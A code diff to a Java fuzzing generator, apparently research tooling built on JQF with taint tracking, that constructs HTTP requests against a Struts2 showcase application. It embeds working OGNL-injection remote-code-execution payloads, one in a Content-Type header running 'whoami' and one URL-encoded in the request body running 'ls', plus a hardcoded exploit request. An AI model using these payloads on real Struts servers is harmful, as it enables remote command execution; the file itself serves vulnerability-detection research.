@@ -4,6 +4,11 @@ import com.pholser.junit.quickcheck.generator.GenerationStatus;
 import com.pholser.junit.quickcheck.generator.Generator;
 import com.pholser.junit.quickcheck.random.SourceOfRandomness;
 import edu.berkeley.cs.jqf.examples.common.DictionaryBackedStringGenerator;
+import edu.berkeley.cs.jqf.fuzz.guidance.StringEqualsHintingInputStream;
+import edu.columbia.cs.psl.phosphor.runtime.Taint;
+import edu.columbia.cs.psl.phosphor.struct.LazyCharArrayObjTags;
+import edu.columbia.cs.psl.phosphor.struct.TaintedObjectWithObjTag;
+import edu.gmu.swe.knarr.runtime.Symbolicator;
 import org.apache.http.Header;
 import org.apache.http.client.methods.HttpUriRequest;
 import org.apache.http.client.methods.RequestBuilder;
@@ -23,8 +28,6 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 
     private Boolean OGNLInjectionDone;
 
-
-
     public StrutsRequestGenerator() {
         super();
         try {
@@ -36,6 +39,26 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
         }
     }
 
+
+
+    private static String applyTaints(String result, Object taint) {
+        if (!(taint instanceof TaintedObjectWithObjTag))
+            return result;
+
+        String ret = new String(result);
+
+        if (Symbolicator.getTaints(result) instanceof LazyCharArrayObjTags) {
+            LazyCharArrayObjTags taints = (LazyCharArrayObjTags) Symbolicator.getTaints(result);
+            if (taints.taints != null)
+                for (int i = 0 ; i < taints.taints.length ; i++)
+                    taints.taints[i] = (taints.taints[i] == null ? ((Taint)((TaintedObjectWithObjTag)taint).getPHOSPHOR_TAG()) : taints.taints[i]);
+            else
+                taints.setTaints(((Taint)((TaintedObjectWithObjTag)taint).getPHOSPHOR_TAG()));
+        }
+
+        return ret;
+
+    }
 
     private Boolean decideIfInjectOGNL(SourceOfRandomness random) {
         Boolean result =  random.nextBoolean() &&  !this.OGNLInjectionDone;
@@ -66,15 +89,123 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 
 
         // Add more headers - make sure not to step over the ones we need
-//        int index = random.nextInt(max_elements);
+        int index = random.nextInt(max_elements);
+        int i = 0;
+
+        boolean coin = random.nextBoolean();
+        int choice = random.nextInt(0, Integer.MAX_VALUE);
+
+
+
+        while(i< index) {
+            String newHeader = "";
+            String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
+
+            if (hints != null && hints.length > 0 && coin) {
+                choice = choice % hints.length;
+                newHeader = new String(hints[choice]);
+                newHeader = applyTaints(newHeader, choice);
+            } else {
+                newHeader = makeString(random, status);
+                newHeader = applyTaints(newHeader, i);
+            }
+
+
+            coin = random.nextBoolean();
+            choice = random.nextInt(0, Integer.MAX_VALUE);
+            if(!staticHeaders.contains(newHeader)) {
+
+                String val = "";
+
+
+                if (hints != null && hints.length > 0 && coin) {
+                    choice = choice % hints.length;
+                    val = hints[choice];
+                    val = applyTaints(val, choice);
+                } else {
+                    val = makeMultiLineString(random, status);
+                    val = applyTaints(val, choice);
+                }
+
+                newHeader = applyTaints(newHeader, i);
+                builder.addHeader(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :val);
+                i++;
+            }
+        }
+    }
+
+    private String createHeaderString(String headerType, String headerVal) {
+        return headerType + ": " + headerVal + "\r\n";
+    }
+    private ArrayList<String> getStrutsHeaderStrings(SourceOfRandomness random, GenerationStatus status, String body) {
+        Boolean injectOGNLInHeaders = random.nextBoolean();
+
+        ArrayList<String> ret = new ArrayList<>();
+
+        Set<String> staticHeaders = new HashSet<>();
+        staticHeaders.add("Host");
+        staticHeaders.add("Content-Type");
+        staticHeaders.add("Content-Length");
+
+
+        // Must have these headers to mke valid request
+        ret.add(createHeaderString("Host", (injectOGNLInHeaders && false) ? this.OGNLInjectionStrings.generate(random, status) :"any"));
+
+
+        String contentType  ="${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+
+        contentType = applyTaints(contentType, 1);
+
+        ret.add(createHeaderString("Content-Type", contentType));
+
+        ret.add(createHeaderString("Content-Length", String.valueOf(body.length())));
+
+
+
+//        // Add more headers - make sure not to step over the ones we need
+//        int index = random.nextInt(1);
 //        int i = 0;
+//
+//        boolean coin = random.nextBoolean();
+//        int choice = random.nextInt(0, Integer.MAX_VALUE);
+//
+//
 //        while(i< index) {
-//            String newHeader = makeString(random, status);
+//            String newHeader = "";
+//            String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
+//
+//            if (hints != null && hints.length > 0 && coin) {
+//                choice = choice % hints.length;
+//                newHeader = new String(hints[choice]);
+//                newHeader = applyTaints(newHeader, choice);
+//            } else {
+//                newHeader = makeString(random, status);
+//                newHeader = applyTaints(newHeader, i);
+//            }
+//
+//
+//            coin = random.nextBoolean();
+//            choice = random.nextInt(0, Integer.MAX_VALUE);
 //            if(!staticHeaders.contains(newHeader)) {
-//                builder.addHeader(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :makeMultiLineString(random, status));
+//
+//                String val = "";
+//
+//
+//                if (hints != null && hints.length > 0 && coin) {
+//                    choice = choice % hints.length;
+//                    val = hints[choice];
+//                    val = applyTaints(val, choice);
+//                } else {
+//                    val = makeMultiLineString(random, status);
+//                    val = applyTaints(val, choice);
+//                }
+//
+//                ret.add(createHeaderString(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :val));
 //                i++;
 //            }
 //        }
+
+        return ret;
     }
 
     @Override
@@ -88,61 +219,60 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
         HttpUriRequest req =  builder.build();
 
 
-        String request = req.toString() + "\r\n";
+       // String request = req.toString() + "\r\n";
+
+        String request = getReqTypeString(random) + "\r\n";
 
         Header[] headerFields = req.getAllHeaders();
-        for (int i = 0; i < headerFields.length; i++) {
-            request += (headerFields[i].getName() + ": " + headerFields[i].getValue() + "\r\n");
+
+        ArrayList<String> headerStrings = getStrutsHeaderStrings(random, status, body);
+        for (int i = 0; i < headerStrings.size(); i++) {
+
+
+            request += headerStrings.get(i);
         }
         request += "\r\n";
         request += body;
         request += "\r\n\r\n";
 
         this.OGNLInjectionDone = false;
+
+        request = "POST /" + "struts2-showcase-2_3_10" + "/integration/saveGangster.action HTTP/1.1\r\n" +
+                "Host: any\r\n" +
+                "Content-Type:" + applyTaints("${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", 1) + "\r\n" +
+                "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
         return request;
     }
 
     protected String getBody(SourceOfRandomness random, GenerationStatus status, String url) {
-        String OGNL_INJECTION_STRING = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D";
-        String dictPath = url.replace('!', '_') + "body_vals.dict";
-        ArrayList<String> bodyVals = new ArrayList<>();
-        try (InputStream in = ClassLoader.getSystemClassLoader().getResourceAsStream("dictionaries" + dictPath)) {
-
-            // no dictionary.... return an empty body.
-            if (in == null) {
-                //System.out.println("COULDNT FIND THE DICTIONARY " + "dictionaries" + dictPath);
-                return "";
-                //throw new FileNotFoundException("Dictionary file not found: " +  "dictionaries" + dictPath);
-            }
-
-           // System.out.println("FOUND THE DICTIONARY! " + "dictionaries" + dictPath);
-
-            BufferedReader br = new BufferedReader(new InputStreamReader(in));
-            String item;
-            while ((item = br.readLine()) != null) {
-                bodyVals.add(item);
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-
-
         String body = "";
-        for(int i = 0; i < bodyVals.size(); i++) {
+       try {
+           String OGNL_INJECTION_STRING = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D";
+           String dictPath = url.replace('!', '_') + "body_vals.dict";
+           ArrayList<String> bodyVals = getDictionaryValues("dictionaries" + dictPath);
 
-            body += (bodyVals.get(i) + "=");
 
-            //OGNL Injection?
-            if(random.nextBoolean()) {
-                body += OGNL_INJECTION_STRING;
-            } else {
-                body += randomStringGenerator.generate(random, status);
-            }
+           if(bodyVals != null) {
 
-            if(i != bodyVals.size() - 1) {
-                body += "&";
-            }
-        }
+               for (int i = 0; i < bodyVals.size(); i++) {
+
+                   body += (bodyVals.get(i) + "=");
+
+                   //OGNL Injection?
+                   if (random.nextBoolean()) {
+                       body += OGNL_INJECTION_STRING;
+                   } else {
+                       body += randomStringGenerator.generate(random, status);
+                   }
+
+                   if (i != bodyVals.size() - 1) {
+                       body += "&";
+                   }
+               }
+           }
+       }catch(NullPointerException e) {
+           e.printStackTrace();
+       }
 
 
         return body;
@@ -167,5 +297,74 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
             default:
                 return null;
         }
+    }
+
+
+
+    private String chooseAndTaint(ArrayList<String> in, SourceOfRandomness random) {
+
+        int choice = random.nextInt(0, Integer.MAX_VALUE);
+        int index = choice % in.size();
+        String ret = in.get(index);
+        ret = applyTaints(ret, index);
+        return ret;
+
+    }
+
+    private ArrayList<String> getDictionaryValues(String dictPath) {
+        ArrayList<String> vals = new ArrayList<>();
+        try (InputStream in = ClassLoader.getSystemClassLoader().getResourceAsStream(dictPath)) {
+
+            // no dictionary.... return an empty body.
+            if (in == null) {
+                System.out.println("COULDNT FIND THE DICTIONARY " +  dictPath);
+                return null;
+                //throw new FileNotFoundException("Dictionary file not found: " +  "dictionaries" + dictPath);
+            }
+
+            // System.out.println("FOUND THE DICTIONARY! " + "dictionaries" + dictPath);
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(in));
+            String item;
+            while ((item = br.readLine()) != null) {
+                vals.add(item);
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        return vals;
+
+    }
+
+    private String getReqTypeString(SourceOfRandomness random) {
+
+        ArrayList<String> urlVals = getDictionaryValues("dictionaries/struts-showcase-validUrls.dict");
+
+
+        String url = chooseAndTaint(urlVals, random);
+
+        int index = 1; //random.nextInt(1);
+        String result = "";
+        switch(index) {
+            case 0:
+                result = "GET" ;// RequestBuilder.get(this.validUrlGenerator.generate(random, status));
+                break;
+            case 1:
+                result = "POST"; //RequestBuilder.post(this.validUrlGenerator.generate(random, status));
+                break;
+            case 2:
+                result = "HEAD"; //return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
+                break;
+            case 3:
+                result = "DELETE"; //return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
+                break;
+            case 4:
+                result = "TRACE"; //return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
+                break;
+        }
+        result += (" " + url + " HTTP/1.1");
+        result = applyTaints(result, index);
+        return result;
     }
 }
